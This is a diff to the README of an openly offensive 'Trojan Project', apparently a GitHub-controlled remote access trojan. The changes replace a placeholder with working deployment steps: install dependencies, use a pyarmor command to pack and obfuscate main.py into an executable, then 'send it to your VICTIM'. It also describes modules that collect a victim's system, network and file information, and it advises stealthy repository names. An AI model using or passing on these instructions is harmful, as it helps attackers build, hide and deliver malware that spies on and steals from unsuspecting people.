@@ -9,7 +9,7 @@ Welcome to the **Trojan Project**, currently in its **beta stage**. This project
 
 ## 🔥 Current Features
 - **System Information Retrieval 🖥️**  
-  Gather detailed information about the target's operating system and environment variables. This module helps understand the victim's system setup and Retrieve detailed network configuration data, including IP addresses, active connections, and public IP information.
+  Gather detailed information about the target's operating system and environment variables. This module helps understand the victim's system setup and retrieve detailed network configuration data, including IP addresses, active connections, and public IP information.
   
 - **Directory Lister 📂**  
   Explore files and directories in the target's system, enabling navigation through the victim's file system.
@@ -85,15 +85,16 @@ return sess.repository(user, 'Trojan')  # Replace 'Trojan' with your repository 
 
 3. Create a private repository with a discreet name (avoid names like "Trojan" to maintain stealth).
 
-... rest of the guide will be soon :D
+4. Install the required dependencies:
+   ```bash
+   pip install -r requirements.txt
+   ```
 
----
-
-### **Future Deployment**
-Once all changes are made:
-- **Generate an EXE file**: You’ll convert the project into an executable file that can be shared with your "victim". (Deployment instructions coming soon.)
-- Customize the repository name and user credentials to ensure privacy and security.
-- Use obfuscation tools to minimize detection risk during deployment.
+5. Prepare the executable:
+   ```bash
+   pyarmor pack -x " --add-data config/*:config --add-data modules/*:modules" main.py
+   ```
+   Then send it to your "VICTIM".
 
 ---
 
